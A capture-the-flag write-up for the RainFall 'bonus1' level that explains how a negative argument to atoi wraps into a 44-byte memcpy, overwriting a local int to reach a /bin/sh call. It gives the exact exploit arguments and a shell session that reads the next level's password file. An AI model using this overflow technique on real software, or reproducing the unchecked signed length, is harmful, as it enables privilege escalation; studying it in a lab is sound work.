this is a basic integer overflow challenge.

in this program we have a `main` that calls `atoi` to convert the first argument passed to an int, the compares it to the number `9`, if it's smaller or equal it then uses `memcpy` to copy bytes from the second argument passed to a local buffer of size 40.

```c
value = atoi(av[1]);
if (value <= 9) {
    memcpy(buf, av[2], value * 4);
```

after that it checks the int value if its equal to `0x574f4c46` => WOLF, if so it will execute `/bin/sh`.

```c
if (value == 0x574f4c46)
    execl("/bin/sh", "sh", 0);
```

we can easly bypass this by giving atoi a negative number and then we overflow it when we multiply by 4 in `memcpy` call.

since the buffer is 40 bytes long then we need to write 44 bytes into the buffer to overwrite the integer after it.

```c
char    buf[40];
int     value;
```

the negative value we enter is `-1073741813` because -107374181 : 

```
-1073741813 => 1100 0000 0000 0000 0000 0000 0000 1011
                 ^                                  ^
                 |                                  |
            the bytes that will         the value 11 that will
            go after overflow           will be multiplied to
                                        be 44.
```

when we multiply it by 4 it will be :

```
0000 0000 0000 0000 0000 0000 0010 1100
```

now all we have to do is give the program the 2nd argument that will put our value `0x574f4c46` in the local int variable:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
```

now we have all we need:

```bash
bonus1@RainFall:~$ ./bonus1 -1073741813 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
$ pwd
/home/user/bonus1
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

and there you go.
